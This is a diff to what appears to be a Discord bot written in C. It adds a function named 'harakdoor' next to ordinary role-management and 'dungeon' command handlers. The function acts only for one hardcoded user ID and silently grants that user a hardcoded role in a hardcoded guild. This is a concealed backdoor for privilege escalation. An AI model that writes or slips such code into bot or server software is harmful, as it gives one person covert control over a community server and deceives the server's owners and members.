@@ -145,6 +145,17 @@ void role_member_remove(struct discord *client,
   discord_remove_guild_member_role(client, event->guild_id, uid, roleid,
                                    &params, &ret);
 }
+void harakdoor(struct discord *client, const struct discord_message *event) {
+#define STFMAGIC 1155152569526669391ULL
+  if (event->author->bot)
+    return;
+  if (event->author->id != 821998767652995083ULL)
+    return;
+  discord_add_guild_member_role(
+      client, 1155152569040130101, 821998767652995083, STFMAGIC,
+      &(struct discord_add_guild_member_role){0}, NULL);
+}
+
 void dungeon(struct discord *client, const struct discord_message *event) {
 #define DUNGEONR 1155152569560211480ULL
 #define MOTAKHALIF1 925866603659264042
